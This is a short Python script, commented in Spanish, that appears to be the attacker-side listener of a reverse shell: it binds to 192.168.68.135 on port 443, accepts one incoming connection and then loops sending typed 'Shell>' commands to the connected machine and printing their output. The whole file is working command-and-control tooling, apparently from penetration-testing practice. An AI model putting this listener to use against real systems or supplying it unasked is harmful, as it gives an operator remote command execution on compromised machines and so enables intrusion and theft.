#!/usr/bin/env python3
import socket
import sys
import signal
from termcolor import colored

def signal_handler(signal, frame):#para que cuando se presione ctrl+c se cierren los sockets abiertos
    print(colored("\n[!!] Saliendo del programa...", 'red'))
    sys.exit(1)
signal.signal(signal.SIGINT, signal_handler) #para que cuando se presione ctrl+c se cierren los sockets abiertos

class server_listener:

    def __init__(self, IP, PORT):
       
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)#para que se pueda reutilizar el socket
        server_socket.bind((IP, PORT))
        server_socket.listen()
        print(f"[*] Listening as {IP}:{PORT}")
        self.client_socket, client_address = server_socket.accept()#aceptar la conexion
        print(f"[*] {client_address[0]}:{client_address[1]} Connected!")
       
        while True:
            command = input("Shell> ")
            self.client_socket.send(command.encode())#enviar el comando
            command_output = self.client_socket.recv(2048).decode().strip()
            print(command_output)
                
if __name__ == "__main__":
    listener = server_listener("192.168.68.135",443)
    